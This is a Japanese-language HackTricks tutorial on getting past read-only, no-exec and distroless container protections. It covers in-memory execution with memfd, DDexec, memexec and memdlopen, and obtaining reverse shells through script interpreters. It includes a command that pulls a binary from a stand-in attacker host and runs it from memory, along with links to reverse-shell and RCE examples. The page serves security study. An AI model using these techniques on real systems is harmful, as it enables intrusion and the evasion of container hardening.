# FS保護のバイパス: 読み取り専用 / no-exec / Distroless

{% hint style="success" %}
AWSハッキングを学び、実践する:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
GCPハッキングを学び、実践する: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksをサポートする</summary>

* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください！
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
* **ハッキングトリックを共有するには、[**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。**

</details>
{% endhint %}

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**ハッキングキャリア**に興味があり、ハッキング不可能なものをハッキングしたい方 - **私たちは採用しています！** (_流暢なポーランド語の読み書きが必要です_)。

{% embed url="https://www.stmcyber.com/careers" %}

## 動画

以下の動画では、このページで言及された技術がより深く説明されています：

* [**DEF CON 31 - Linuxメモリ操作の探求：ステルスと回避**](https://www.youtube.com/watch?v=poHirez8jk4)
* [**DDexec-ngとインメモリdlopen()によるステルス侵入 - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM\_gjjiARaU)

## 読み取り専用 / no-execシナリオ

Linuxマシンが**読み取り専用（ro）ファイルシステム保護**でマウントされていることがますます一般的になっています。特にコンテナでは、**`readOnlyRootFilesystem: true`**を`securitycontext`に設定するだけで、roファイルシステムでコンテナを実行することができます：

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

しかし、ファイルシステムがroとしてマウントされていても、**`/dev/shm`**は書き込み可能であるため、ディスクに何も書き込めないというのは偽りです。ただし、このフォルダは**no-exec保護**でマウントされるため、ここにバイナリをダウンロードしても**実行することはできません**。

{% hint style="warning" %}
レッドチームの観点から見ると、これは**システムに既に存在しないバイナリをダウンロードして実行することを複雑にします**（バックドアや`kubectl`のような列挙ツールなど）。
{% endhint %}

## 最も簡単なバイパス: スクリプト

バイナリについて言及したことに注意してください。インタープリタがマシン内にある限り、**任意のスクリプトを実行できます**。例えば、`sh`が存在する場合は**シェルスクリプト**、`python`がインストールされている場合は**Pythonスクリプト**です。

しかし、これはあなたのバイナリバックドアや他のバイナリツールを実行するには十分ではありません。

## メモリバイパス

バイナリを実行したいがファイルシステムがそれを許可していない場合、最良の方法は**メモリから実行すること**です。なぜなら、**保護はそこには適用されないからです**。

### FD + execシステムコールバイパス

マシン内に**Python**、**Perl**、または**Ruby**のような強力なスクリプトエンジンがある場合、メモリから実行するためにバイナリをダウンロードし、メモリファイルディスクリプタ（`create_memfd`システムコール）に保存できます。これはこれらの保護によって保護されないため、**`exec`システムコール**を呼び出して**実行するファイルとしてfdを指定**できます。

これには、プロジェクト[**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec)を簡単に使用できます。バイナリを渡すと、**バイナリが圧縮され、b64エンコードされ**、`create_memfd`システムコールを呼び出して作成された**fd**で**デコードおよび解凍する**ための指示を含むスクリプトが指定された言語で生成されます。

{% hint style="warning" %}
これは、PHPやNodeのような他のスクリプト言語では機能しません。なぜなら、スクリプトから生のシステムコールを呼び出す**デフォルトの方法がないため**、バイナリを保存するための**メモリfd**を作成するために`create_memfd`を呼び出すことができないからです。

さらに、`/dev/shm`にファイルを持つ**通常のfd**を作成しても機能しません。なぜなら、**no-exec保護**が適用されるため、実行することが許可されないからです。
{% endhint %}

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec)は、プロセスの**`/proc/self/mem`**を上書きすることによって**自分のプロセスのメモリを変更する**技術です。

したがって、プロセスによって実行されているアセンブリコードを**制御することができ**、**シェルコード**を書き込み、プロセスを「変異」させて**任意のコードを実行する**ことができます。

{% hint style="success" %}
**DDexec / EverythingExec**を使用すると、**メモリから**自分の**シェルコード**や**任意のバイナリ**を**ロードして実行**できます。
{% endhint %}
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
For more information about this technique check the Github or:

{% content-ref url="ddexec.md" %}
[ddexec.md](ddexec.md)
{% endcontent-ref %}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) は DDexec の自然な次のステップです。これは **DDexec シェルコードのデーモン化** であり、異なるバイナリを **実行したいとき** に DDexec を再起動する必要はなく、DDexec テクニックを介して memexec シェルコードを実行し、**このデーモンと通信して新しいバイナリを読み込んで実行する** ことができます。

**memexec を使用して PHP リバースシェルからバイナリを実行する方法の例** は [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php) で見つけることができます。

### Memdlopen

DDexec と同様の目的を持つ [**memdlopen**](https://github.com/arget13/memdlopen) テクニックは、**メモリにバイナリを読み込む** より簡単な方法を提供します。依存関係を持つバイナリを読み込むことも可能です。

## Distroless Bypass

### What is distroless

Distroless コンテナは、特定のアプリケーションやサービスを実行するために必要な **最小限のコンポーネント** のみを含み、ライブラリやランタイム依存関係を含みますが、パッケージマネージャー、シェル、システムユーティリティなどの大きなコンポーネントは除外されます。

Distroless コンテナの目的は、**不要なコンポーネントを排除することによってコンテナの攻撃面を減少させ**、悪用可能な脆弱性の数を最小限に抑えることです。

### Reverse Shell

Distroless コンテナでは、**通常のシェルを取得するための `sh` や `bash`** が見つからないかもしれません。また、`ls`、`whoami`、`id` などのバイナリも見つかりません... システムで通常実行するすべてのものです。

{% hint style="warning" %}
したがって、**リバースシェル**を取得したり、通常のようにシステムを**列挙**したりすることはできません。
{% endhint %}

しかし、もし侵害されたコンテナが例えばフラスクウェブを実行している場合、Python がインストールされているため、**Python リバースシェル**を取得できます。ノードを実行している場合は、Node リバースシェルを取得でき、ほとんどの **スクリプト言語**でも同様です。

{% hint style="success" %}
スクリプト言語を使用することで、言語の機能を利用して**システムを列挙**することができます。
{% endhint %}

もし **`read-only/no-exec`** 保護がなければ、リバースシェルを悪用して **ファイルシステムにバイナリを書き込み**、**実行**することができます。

{% hint style="success" %}
ただし、この種のコンテナでは通常これらの保護が存在しますが、**以前のメモリ実行テクニックを使用してそれらを回避する**ことができます。
{% endhint %}

**RCE 脆弱性を悪用してスクリプト言語のリバースシェルを取得し、メモリからバイナリを実行する方法の例** は [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE) で見つけることができます。

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**ハッキングキャリア**に興味があり、ハッキング不可能なものをハッキングしたい方 - **私たちは採用中です！** (_流暢なポーランド語の読み書きが必要です_)。

{% embed url="https://www.stmcyber.com/careers" %}

{% hint style="success" %}
AWS ハッキングを学び、実践する：<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
GCP ハッキングを学び、実践する：<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください！
* 💬 [**Discord グループ**](https://discord.gg/hRep4RUj7f) または [**Telegram グループ**](https://t.me/peass) に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live) をフォローしてください。
* [**HackTricks**](https://github.com/carlospolop/hacktricks) と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) の GitHub リポジトリに PR を提出してハッキングトリックを共有してください。

</details>
{% endhint %}
